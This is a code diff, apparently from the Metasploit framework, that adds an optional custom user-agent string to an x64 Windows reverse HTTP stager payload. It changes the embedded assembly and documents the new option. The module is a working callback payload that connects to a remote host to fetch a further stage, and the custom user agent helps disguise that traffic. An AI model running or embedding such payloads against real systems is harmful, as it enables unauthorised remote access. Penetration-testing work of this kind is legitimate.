@@ -62,7 +62,7 @@ module Payload::Windows::ReverseHttp_x64
       # Otherwise default to small URIs
       conf[:url]        = luri + generate_small_uri
     end
-
+  
     generate_reverse_http(conf)
   end
 
@@ -168,6 +168,7 @@ module Payload::Windows::ReverseHttp_x64
   # @option opts [String] :url The URI to request during staging
   # @option opts [String] :host The host to connect to
   # @option opts [Integer] :port The port to connect to
+  # @option opts [String] :ua The User Agent the payload will use
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [String] :proxy_host The optional proxy server host to use
   # @option opts [Integer] :proxy_port The optional proxy server port to use
@@ -245,8 +246,20 @@ module Payload::Windows::ReverseHttp_x64
       internetopen:
         push rbx                      ; stack alignment
         push rbx                      ; NULL pointer
-        mov rcx, rsp                  ; lpszAgent ("")
     ^
+
+    if opts[:ua]
+      asm << %Q^
+        call load_useragent
+        db"#{opts[:ua]}", 0x00
+      load_useragent:
+        pop rcx                         ; lpszAgent (stack pointer)
+      ^
+    else
+      asm << %Q^
+        mov rcx, rsp                    ; lpszAgent("")
+      ^
+    end
 
     if proxy_enabled
       asm << %Q^
